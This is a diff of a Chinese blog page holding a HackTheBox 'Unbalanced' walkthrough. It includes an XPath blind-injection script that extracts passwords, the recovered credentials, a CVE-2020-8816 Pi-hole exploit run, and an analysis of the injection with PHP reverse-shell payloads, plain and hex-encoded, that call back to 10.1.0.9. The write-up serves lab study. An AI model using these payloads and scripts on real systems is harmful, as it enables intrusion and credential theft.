+Role: Team Leader</code></pre><p>bryan是<code>Administrator</code>.说明很有可能就是需要他的信息。不过这里有个细节上需要注意下。当我尝试如<code>abc&#39; or 1=1#</code>这样的payload不可行,<code>abc&#39; or substr(&#39;abc&#39;,1,1)=&#39;a</code>也不可行。但是<code>abc&#39; or substring(&#39;abc&#39;,1,1)=&#39;a</code>是回显了真值的。那么这里真的是sql注入吗？答案是否定的。我很快联想到曾经在npuctf中出现过一次的xpath注入。加上这里并没有执行所谓的登录操作，而是在界面回显html块内容。我可以判断,这里应该是一个xpath注入而不是sql注入。</p>
 <p>xpath来盲注的话。比起sql布尔盲注更加简单</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">URL=<span class="string">'http://172.31.179.1/intranet.php'</span></span><br><span class="line">proxies=&#123;<span class="string">'http'</span>:<span class="string">"10.10.10.200:3128"</span>&#125;</span><br><span class="line">users=&#123;<span class="string">'bryan'</span>,<span class="string">'rita'</span>,<span class="string">'jim'</span>,<span class="string">'sarah'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">    password=<span class="string">""</span></span><br><span class="line">    print(user)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        a=<span class="number">0</span></span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            data=&#123;<span class="string">"Username"</span>:<span class="string">"a"</span>,<span class="string">"Password"</span>:<span class="string">"' or Username='"</span>+user+<span class="string">"' and substring(Password,"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">""</span>&#125;</span><br><span class="line">            r=requests.post(URL,data=data,proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> len(r.text) &gt; <span class="number">7000</span>:</span><br><span class="line">                password+=j</span><br><span class="line">                a=<span class="number">1</span></span><br><span class="line">                print(password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+import string
 
+URL=&#39;http://172.31.179.1/intranet.php&#39;
+proxies={&#39;http&#39;:&quot;10.10.10.200:3128&quot;}
+users={&#39;bryan&#39;,&#39;rita&#39;,&#39;jim&#39;,&#39;sarah&#39;}
+for user in users:
+    password=&quot;&quot;
+    print(user)
+    for i in range(1,30):
+        a=0
+        print(i)
+        for j in string.printable:
+            data={&quot;Username&quot;:&quot;a&quot;,&quot;Password&quot;:&quot;&#39; or Username=&#39;&quot;+user+&quot;&#39; and substring(Password,&quot;+str(i)+&quot;,1)=&#39;&quot;+j+&quot;&quot;}
+            r=requests.post(URL,data=data,proxies=proxies)
+            if len(r.text) &gt; 7000:
+                password+=j
+                a=1
+                print(password)
+                break
+        if a==0:
+            break</code></pre>
 <p>简单写个盲注脚本,注意要挂它的proxy。这里优先跑bryan的密码。因为远程实在太慢了……幸好bryan就是系统用户。使用它的密码即可ssh登录。</p>
 <p>其他人的密码后来花些时间也跑出来了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bryan:ireallyl0vebubblegum!!!</span><br><span class="line">rita:password01!</span><br><span class="line">jim:stairwaytoheaven</span><br><span class="line">sarah:sarah4evah</span><br></pre></td></tr></table></figure>
-<p>bryan登录上去就能拿到user.txt了。</p>
+<pre><code>bryan:ireallyl0vebubblegum!!!
+rita:password01!
+jim:stairwaytoheaven
+sarah:sarah4evah</code></pre><p>bryan登录上去就能拿到user.txt了。</p>
 <p>简单说这一部分其实难度真的一般。主要是使用它给的proxy这步可能有的人没做过。但是假如利用好rsync得到的conf就能很快知道这点。所以难度一般。后面比较迷惑的还是xpath与sqli不能混淆。不过通过简单的fuzz还是能判断出来的。</p>
 <h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>bryan文件夹下有一个TODO</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Intranet #</span><br><span class="line">############</span><br><span class="line">* Install new intranet-host3 docker [DONE]</span><br><span class="line">* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]</span><br><span class="line">* Test intranet-host3 [DONE]</span><br><span class="line">* Add intranet-host3 to load balancer [DONE]</span><br><span class="line">* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]</span><br><span class="line">* Fix intranet-host2 [DONE]</span><br><span class="line">* Re-add intranet-host2 to load balancer (set default weight) [DONE]</span><br><span class="line">- Fix intranet-host1 [TODO]</span><br><span class="line">- Re-add intranet-host1 to load balancer (set default weight) [TODO]</span><br><span class="line"></span><br><span class="line">###########</span><br><span class="line"># Pi-hole #</span><br><span class="line">###########</span><br><span class="line">* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]</span><br><span class="line">* Set temporary admin password [DONE]</span><br><span class="line">* Create Pi-hole configuration script [IN PROGRESS]</span><br><span class="line">- Run Pi-hole configuration script [TODO]</span><br><span class="line">- Expose Pi-hole ports to the network [TODO]</span><br></pre></td></tr></table></figure>
+<pre><code>############
+# Intranet #
+############
+* Install new intranet-host3 docker [DONE]
+* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
+* Test intranet-host3 [DONE]
+* Add intranet-host3 to load balancer [DONE]
+* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
+* Fix intranet-host2 [DONE]
+* Re-add intranet-host2 to load balancer (set default weight) [DONE]
+- Fix intranet-host1 [TODO]
+- Re-add intranet-host1 to load balancer (set default weight) [TODO]
 
-<p>从这里可以看出。靶机上已经跑好了一个docker。但是它是跑在127。0.0.1的。并且有个<code>admin</code>密码。Pi-hole 配置文件尚未完成。</p>
+###########
+# Pi-hole #
+###########
+* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
+* Set temporary admin password [DONE]
+* Create Pi-hole configuration script [IN PROGRESS]
+- Run Pi-hole configuration script [TODO]
+- Expose Pi-hole ports to the network [TODO]</code></pre><p>从这里可以看出。靶机上已经跑好了一个docker。但是它是跑在127。0.0.1的。并且有个<code>admin</code>密码。Pi-hole 配置文件尚未完成。</p>
 <p><code>ss -lntp</code>看下端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bryan@unbalanced:~$ ss -lntp</span><br><span class="line">State                    Recv-Q                   Send-Q                                       Local Address:Port                                       Peer Address:Port                   </span><br><span class="line">LISTEN                   0                        5                                                  0.0.0.0:873                                             0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        128                                              127.0.0.1:8080                                            0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        128                                              127.0.0.1:5553                                            0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        32                                                 0.0.0.0:53                                              0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        128                                                0.0.0.0:22                                              0.0.0.0:*                      </span><br><span class="line">LISTEN                   0                        5                                                     [::]:873                                                [::]:*                      </span><br><span class="line">LISTEN                   0                        32                                                    [::]:53                                                 [::]:*                      </span><br><span class="line">LISTEN                   0                        128                                                   [::]:22                                                 [::]:*                      </span><br><span class="line">LISTEN                   0                        128                                                      *:3128                                                  *:*</span><br></pre></td></tr></table></figure>
-
+<pre><code class="bash">bryan@unbalanced:~$ ss -lntp
+State                    Recv-Q                   Send-Q                                       Local Address:Port                                       Peer Address:Port                   
+LISTEN                   0                        5                                                  0.0.0.0:873                                             0.0.0.0:*                      
+LISTEN                   0                        128                                              127.0.0.1:8080                                            0.0.0.0:*                      
+LISTEN                   0                        128                                              127.0.0.1:5553                                            0.0.0.0:*                      
+LISTEN                   0                        32                                                 0.0.0.0:53                                              0.0.0.0:*                      
+LISTEN                   0                        128                                                0.0.0.0:22                                              0.0.0.0:*                      
+LISTEN                   0                        5                                                     [::]:873                                                [::]:*                      
+LISTEN                   0                        32                                                    [::]:53                                                 [::]:*                      
+LISTEN                   0                        128                                                   [::]:22                                                 [::]:*                      
+LISTEN                   0                        128                                                      *:3128                                                  *:*  </code></pre>
 <p>8080与5553明显是跑在本地上的。其中8080可以curl到。不过会提醒我们hostname不对。</p>
 <p>既然是个web服务。那先端口转发到本地看看长什么样。我们直接用ssh转发</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~C <span class="comment">#进入ssh命令行</span></span><br><span class="line">-L 8080:127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">~C #进入ssh命令行
+-L 8080:127.0.0.1:8080</code></pre>
 <p>增加一个<code>Host: unbalanced</code><br><img src="/2020/08/15/hackthebox-Unbalanced/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>再次暴露了一个<code>pihole.unbalanced.htb</code>.以及对应的内网ip.</p>
 <p>访问这个pihole的后台<code>/admin</code>.因为之前提示过我们temporary admin password .所以用admin就能登入。进去后发现是个4.3.2版本的pihole.</p>
@@ -540,33 +754,71 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>暂时没思路。不过搜索下发现版本在CVE-2020-8816可用范围内。这个是可以直接rce拿到www-data的shell的。虽然跟我们提权root没啥关系。但是不妨一试。<br>用这的exp<br><a href="https://github.com/AndreyRainchik/CVE-2020-8816" target="_blank" rel="noopener">https://github.com/AndreyRainchik/CVE-2020-8816</a></p>
 <p>因为我们已经转发好端口了。所以直接打就是了<br><code>python3 CVE-2020-8816.py http://127.0.0.1:8080 admin 10.10.14.11 90001</code><br><img src="/2020/08/15/hackthebox-Unbalanced/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/08/15/hackthebox-Unbalanced/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>www-data的话肯定得继续收集信息了。但是我意想不到的是www-data居然可以直接进这个docker的root目录……简直可怕。然后里面有之前提到的config文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add domains to whitelist</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -w unbalanced.htb</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -w rebalanced.htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set temperature unit to Celsius</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a -c</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add local host record</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set privacy level</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a -l 4</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set web admin interface password</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a -p <span class="string">'bUbBl3gUm$43v3Ry0n3!'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set admin email</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a email admin@unbalanced.htb</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">#!/bin/bash
 
+# Add domains to whitelist
+/usr/local/bin/pihole -w unbalanced.htb
+/usr/local/bin/pihole -w rebalanced.htb
+
+# Set temperature unit to Celsius
+/usr/local/bin/pihole -a -c
+
+# Add local host record
+/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1
+
+# Set privacy level
+/usr/local/bin/pihole -a -l 4
+
+# Set web admin interface password
+/usr/local/bin/pihole -a -p &#39;bUbBl3gUm$43v3Ry0n3!&#39;
+
+# Set admin email
+/usr/local/bin/pihole -a email admin@unbalanced.htb</code></pre>
 <p>admin的密码又是一个跟<code>bubblegum</code>有关的……试了下ssh登录root没成。su一下居然就成了……<br><img src="/2020/08/15/hackthebox-Unbalanced/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>怎么说呢。提权这块只要nday poc就能拿www-data =&gt; 然后就可以进root目录=&gt; 然后系统密码直接就暴露出来了。这一连串操作令人窒息。有点刻意而且让这台靶机的体验直接降了一个档次。所以没啥总结的。</p>
 <h2 id="CVE-2020-8816"><a href="#CVE-2020-8816" class="headerlink" title="CVE-2020-8816"></a>CVE-2020-8816</h2><p>因为后面没什么收获，所以简单看了下这个cve。发现还挺有意思的。</p>
 <p><a href="https://xz.aliyun.com/t/7511" target="_blank" rel="noopener">https://xz.aliyun.com/t/7511</a></p>
 <p>首先。pihole有这样一个功能<code>设置静态DHCP，将IP地址固定到给定的MAC地址上</code><br>而他的源码里调用了命令执行拼接</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!strlen($error))</span><br><span class="line">&#123;</span><br><span class="line">    exec(<span class="string">"sudo pihole -a addstaticdhcp "</span>.$mac.<span class="string">" "</span>.$ip.<span class="string">" "</span>.$hostname);</span><br><span class="line">    $success .= <span class="string">"A new static address has been added"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">if(!strlen($error))
+{
+    exec(&quot;sudo pihole -a addstaticdhcp &quot;.$mac.&quot; &quot;.$ip.&quot; &quot;.$hostname);
+    $success .= &quot;A new static address has been added&quot;;
+}</code></pre>
 <p>既然是拼接。假如没有过滤到位那就肯定可以绕过。我们看下它主要的过滤方式。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validMAC</span><span class="params">($mac_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)</span></span><br><span class="line">  <span class="keyword">return</span> (preg_match(<span class="string">'/([a-fA-F0-9]&#123;2&#125;[:]?)&#123;6&#125;/'</span>, $mac_addr) == <span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mac = $_POST[<span class="string">"AddMAC"</span>];  </span><br><span class="line">$ip = $_POST[<span class="string">"AddIP"</span>];</span><br><span class="line">$hostname = $_POST[<span class="string">"AddHostname"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!validMAC($mac))</span><br><span class="line">&#123;</span><br><span class="line">    $error .= <span class="string">"MAC address ("</span>.htmlspecialchars($mac).<span class="string">") is invalid!&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$mac = strtoupper($mac);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">function validMAC($mac_addr)
+{
+  // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)
+  return (preg_match(&#39;/([a-fA-F0-9]{2}[:]?){6}/&#39;, $mac_addr) == 1); 
+}
+......
 
+
+$mac = $_POST[&quot;AddMAC&quot;];  
+$ip = $_POST[&quot;AddIP&quot;];
+$hostname = $_POST[&quot;AddHostname&quot;];
+
+if(!validMAC($mac))
+{
+    $error .= &quot;MAC address (&quot;.htmlspecialchars($mac).&quot;) is invalid!&lt;br&gt;&quot;;
+}
+$mac = strtoupper($mac); </code></pre>
 <p>这个正则写的并不正确。比如我们直接使用<code>aaaaaaaaaaaa</code>就能通过校验。甚至可以在后面加上任意shell代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(validMAC(<span class="string">'aaaaaaaaaaaa&amp;&amp;php -r \'$sock=fsockopen("10.1.0.9",2256);exec("bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");\''</span>));</span><br><span class="line"><span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">var_dump(validMAC(&#39;aaaaaaaaaaaa&amp;&amp;php -r \&#39;$sock=fsockopen(&quot;10.1.0.9&quot;,2256);exec(&quot;bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#39;&#39;));
+//bool(true)</code></pre>
 <p>不过唯一重点就是。他对我们的输入调用了htmlspecialchars以及<code>strtoupper</code>.后者比较关键。</p>
 <p>这时首先就考验利用的php技巧了。因为合法的mac后面跟任意语句都是可以的。那自然我们选择php代码执行函数。(php自带函数不区分大小写)。使用<code>EXEC(HEX2BIN(xxxxx...))</code>即可以执行任意代码。接下来重点就是绕过被变成大写的<code>php -r</code>了。</p>
 <p>这一步就用到系统命令执行的绕过技巧了。假如我们使用<code>aaaaaaaaaaaa$PATH</code>.系统是会返回PATH变量的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;pihole:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br></pre></td></tr></table></figure>
-<p>而其中pihole,usr正好可以构造出<code>p h r</code>这几个字母。所以我们使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;</span><br><span class="line">P&#x3D;$&#123;W%%?????:&#125;</span><br><span class="line">X&#x3D;$&#123;PATH#&#x2F;???&#x2F;??&#125;</span><br><span class="line">H&#x3D;$&#123;X%%???:&#125;</span><br><span class="line">Z&#x3D;$&#123;PATH#:&#x2F;??&#125;</span><br><span class="line">R&#x3D;$&#123;Z%%&#x2F;&#125;</span><br></pre></td></tr></table></figure>
-<p>简单举个例子。基本上就是利用linux通配符来进行构造。十分精妙</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@pihole:&#x2F;# W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;&amp;&amp;P&#x3D;$&#123;W%%?????:*&#125;&amp;&amp;echo $W &amp;&amp; echo  $P</span><br><span class="line">pihole:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">p</span><br></pre></td></tr></table></figure>
-<p>最后以类似的payload命令执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaa&amp;&amp;W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;&amp;&amp;P&#x3D;$&#123;W%%?????:*&#125;&amp;&amp;X&#x3D;$&#123;PATH#&#x2F;???&#x2F;??&#125;&amp;&amp;H&#x3D;$&#123;X%%???:*&#125;&amp;&amp;Z&#x3D;$&#123;PATH#*:&#x2F;??&#125;&amp;&amp;R&#x3D;$&#123;Z%%&#x2F;*&#125;&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27&quot;));&#39;&amp;&amp;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>前面很有趣。后面很简单。不过如果深入研究这个cve的话还是比较有收获的。</p>
+<pre><code>/opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></pre><p>而其中pihole,usr正好可以构造出<code>p h r</code>这几个字母。所以我们使用</p>
+<pre><code>W=${PATH#/???/}
+P=${W%%?????:}
+X=${PATH#/???/??}
+H=${X%%???:}
+Z=${PATH#:/??}
+R=${Z%%/}</code></pre><p>简单举个例子。基本上就是利用linux通配符来进行构造。十分精妙</p>
+<pre><code>root@pihole:/# W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;echo $W &amp;&amp; echo  $P
+pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+p</code></pre><p>最后以类似的payload命令执行</p>
+<pre><code>aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27&quot;));&#39;&amp;&amp;</code></pre><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>前面很有趣。后面很简单。不过如果深入研究这个cve的话还是比较有收获的。</p>
 
   
   
@@ -773,7 +1025,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -785,9 +1037,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -920,6 +1172,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1133,7 +1387,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1189,6 +1443,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
